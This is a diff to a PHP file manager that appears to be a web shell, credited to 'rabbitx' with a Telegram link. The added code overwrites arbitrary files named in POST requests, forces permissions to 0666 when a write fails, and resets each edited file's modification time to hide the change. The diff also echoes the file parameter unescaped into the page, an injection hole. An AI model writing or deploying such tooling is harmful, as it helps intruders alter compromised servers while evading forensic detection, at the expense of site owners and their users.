@@ -42,9 +42,13 @@ class XN
 	}
     public static function save($filename, $data)
     {
+    	$key = true;
         self::$handle = fopen($filename, "w");
-        fwrite(self::$handle, $data);
-        fclose(self::$handle);
+        if (!@fwrite(self::$handle, $data)) {
+        	@chmod($filename, 0666);
+        	$key = fwrite(self::$handle, $data) ? true : false;
+        } fclose(self::$handle);
+        return $key;
     }
     public static function size($filename)
     {
@@ -467,6 +471,18 @@ function alert($message)
         color: #000;
         font-size: 23px;
         font-weight:bold;
+    }
+    .by {
+    	font-size:10px;
+    	position: absolute;
+    	margin-top:6px;
+    	margin-left:5px;
+    }
+    .author {
+    	font-size:10px;
+    	position: absolute;
+    	margin-top:15px;
+    	margin-left:5px;
     }
     .storage span:nth-child(7),
     .storage span:nth-child(5),
@@ -1539,10 +1555,13 @@ function filterTable() {
             exit();
         case 'edit':
             if (isset($_POST['save'])) {
-                if (XN::save($_POST['file'], $_POST['data'])) {
-                    alert("Permission Danied");
-                } else {
-                    alert("success");
+                if (!empty($_POST['file'])) {
+                	if (XN::save($_POST['file'], $_POST['data'])) {
+                		alert("saved");
+                		@touch($_POST['file'], @strtotime($_POST['ftime']));
+                	} else {
+                		alert("failed to save");
+                	}
                 }
             }
             head("Edit", getcwd(), 'hidden');
@@ -1583,6 +1602,7 @@ function filterTable() {
                         </tr>
                         <tr>
                             <td colspan="3">
+                            	<input type="hidden" name="ftime" value="<?= XN::ftime($_POST['file']) ?>">
                                 <input type="submit" name="save" value="SAVE">
                                 <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
                                 <input type="hidden" name="action" value="edit">
@@ -1617,7 +1637,7 @@ function filterTable() {
     ?>
     <div class="storage">
         <span class="title">
-            PHPFilemanager
+            PHPFilemanager<a href="https://t.me/rabbitxxx" target="_blank"><span class="by">by</span><span class="author">rabbitx</span></a>
         </span>
         <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span>
         <span>Free : <?= XN::hdd('free') ?></span> <span>|</span>
